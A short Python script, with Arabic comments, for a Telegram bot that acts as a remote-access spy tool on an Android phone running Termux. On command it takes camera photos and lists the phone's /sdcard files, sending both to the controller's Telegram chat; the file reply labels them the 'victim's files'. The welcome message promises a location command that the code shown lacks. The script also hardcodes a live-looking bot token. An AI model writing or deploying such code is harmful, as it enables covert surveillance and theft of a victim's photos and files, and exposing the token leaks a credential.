import telebot
import os
import subprocess

# توكن البوت الخاص بك من الصورة الأخيرة
API_TOKEN = '8518969605:AAGRhiXEaEZy6Bwb2cSn8uYzvAsDx7kCMUk'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "✅ تم الربط بنجاح!\nالآن يمكنك التحكم بالجهاز عبر الأوامر التالية:\n/photo - التقاط صورة\n/files - عرض ملفات الجهاز\n/location - تحديد الموقع")

@bot.message_handler(commands=['photo'])
def take_photo(message):
    bot.reply_to(message, "📸 جاري محاولة التقاط صورة...")
    # يتطلب تثبيت termux-api وتفعيل الصلاحيات
    os.system("termux-camera-photo -c 0 photo.jpg")
    if os.path.exists("photo.jpg"):
        with open("photo.jpg", "rb") as photo:
            bot.send_photo(message.chat.id, photo)
    else:
        bot.reply_to(message, "❌ فشل التقاط الصورة. تأكد من صلاحيات الكاميرا.")

@bot.message_handler(commands=['files'])
def list_files(message):
    try:
        files = subprocess.check_output("ls /sdcard", shell=True).decode()
        bot.reply_to(message, f"📁 ملفات الضحية:\n{files}")
    except:
        bot.reply_to(message, "❌ط لا يمكن الوصول للملفات. اطلب الصلاحية أولاً.")

bot.polling()
